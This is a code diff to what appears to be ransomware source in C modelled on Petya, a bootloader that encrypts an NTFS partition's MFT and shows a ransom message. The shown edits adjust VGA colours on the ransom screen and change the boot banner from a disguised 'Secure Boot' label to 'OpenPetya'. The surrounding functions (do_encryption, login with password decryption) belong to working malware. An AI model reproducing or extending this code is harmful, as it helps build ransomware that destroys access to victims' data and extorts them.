@@ -26,6 +26,7 @@
 #define COLOR_CYAN_ON_BLACK     0x0B
 #define COLOR_YELLOW_ON_BLACK   0x0E
 #define COLOR_WHITE_ON_BLUE     0x1F
+#define COLOR_GRAY_ON_RED       0x49
 #define COLOR_WHITE_ON_RED      0x4F
 #define COLOR_RED_ON_BLACK      0x0C
 #define COLOR_DARKRED_ON_BLACK  0x04
@@ -167,7 +168,7 @@ static uint32_t find_ntfs_partition_lba(void)
 void vga_clear(void)
 {
     volatile uint16_t *vga = VGA_BASE;
-    uint16_t blank = ' ' | (COLOR_WHITE_ON_BLACK << 8);
+    uint16_t blank = ' ' | (current_color << 8);
     for (int i = 0; i < VGA_COLS * VGA_ROWS; i++)
         vga[i] = blank;
     cursor_row = cursor_col = 0;
@@ -342,7 +343,7 @@ void do_encryption(void)
     vga_clear();
 
     vga_set_color(COLOR_WHITE_ON_BLUE);
-    vga_puts("Secure Boot, 1st stage.");
+    vga_puts("OpenPetya, 1st stage.");
     vga_set_color(COLOR_WHITE_ON_BLACK);
     vga_puts("\n\n");
 
@@ -454,7 +455,7 @@ void login(void)
     vga_clear();
 
     vga_set_color(COLOR_WHITE_ON_BLUE);
-    vga_puts("Secure Boot");
+    vga_puts("OpenPetya");
     vga_puts("\n\n");
 
     vga_set_color(COLOR_WHITE_ON_BLACK);
@@ -477,7 +478,7 @@ void login(void)
     while (1)
     {
         vga_clear();
-        vga_set_color(flag == 0 ? COLOR_WHITE_ON_BLACK : COLOR_WHITE_ON_RED);
+        vga_set_color(flag == 0 ? COLOR_GRAY_ON_RED : COLOR_WHITE_ON_RED);
 
         flag = flag ? 0 : 1;
 
@@ -490,8 +491,9 @@ void login(void)
     }
 
     keyboard_getchar();
+
+    vga_set_color(COLOR_WHITE_ON_RED);
     vga_clear();
-    vga_set_color(COLOR_RED_ON_BLACK);
     vga_puts(RANSOM_MSG);
     vga_putchar('\n');
 
@@ -507,6 +509,9 @@ void login(void)
 
         if (ntfs_mft_decrypt(input, partition_lba) == 0)
         {
+            vga_set_color(COLOR_WHITE_ON_BLACK);
+            vga_clear();
+
             zero_buffer(input, MAX_PW_LEN);
 
             vga_set_color(COLOR_GREEN_ON_BLACK);
